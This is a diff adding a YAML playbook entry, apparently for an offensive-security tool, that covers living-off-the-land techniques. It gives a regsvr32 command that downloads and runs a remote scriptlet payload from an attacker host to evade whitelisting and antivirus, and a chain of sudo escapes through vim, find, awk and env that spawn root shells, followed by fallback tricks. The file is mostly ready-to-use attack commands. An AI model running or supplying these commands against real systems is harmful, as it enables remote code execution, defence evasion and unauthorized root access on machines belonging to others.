@@ -1,0 +1,40 @@
+id: lolbas-gtfobins
+name: Living Off The Land (LOLBAS & GTFOBins)
+category: privesc
+description: Fast reference for weaponizing native signed operating system binaries on Windows (LOLBAS) and Linux (GTFOBins) for file transfers, proxying, and stealthy code execution.
+requires_shell: true
+port_triggers: []
+tags:
+  - lolbas
+  - gtfobins
+  - living-off-the-land
+  - evasion
+  - stealth
+steps:
+  - id: lolbas-win-execution
+    title: Windows Signed Binary Code Execution (Regsvr32 / Mshta)
+    phase: exploitation
+    purpose: Execute remote payloads using Microsoft-signed binaries to evade application whitelisting and Antivirus inspection.
+    command: regsvr32.exe /s /n /u /i:http://{{LHOST|10.10.14.2}}:8000/payload.sct scrobj.dll
+    expected_output:
+      - '[HTTP Server: GET /payload.sct -> Connection received on Kali reverse shell]'
+    common_mistakes:
+      - Payload `.sct` must contain XML scriptlet format with VBScript or JScript payload.
+    if_success: Payload executed via signed Microsoft binary!
+    if_failure: Outbound HTTP traffic blocked. Test bitsadmin or rundll32.
+    references:
+      - https://lolbas-project.github.io/
+  - id: gtfobins-linux-breakout
+    title: Linux GTFOBins Sudo / SUID Instant Shells
+    phase: privesc
+    purpose: Quick reference for obtaining instant root shells from common GTFOBins binaries when allowed in `sudo -l` or found with SUID bit.
+    command: 'echo "vim: sudo vim -c '':!/bin/sh'' | find: sudo find . -exec /bin/sh \; -quit | awk: sudo awk ''BEGIN {system(\"/bin/sh\")}'' | env: sudo env /bin/sh"'
+    expected_output:
+      - '# whoami'
+      - root
+    common_mistakes:
+      - Check https://gtfobins.github.io/ for the full searchable list of over 400 binaries.
+    if_success: Root shell spawned!
+    if_failure: Check Linux capabilities (`getcap -r / 2>/dev/null`).
+    references:
+      - https://gtfobins.github.io/
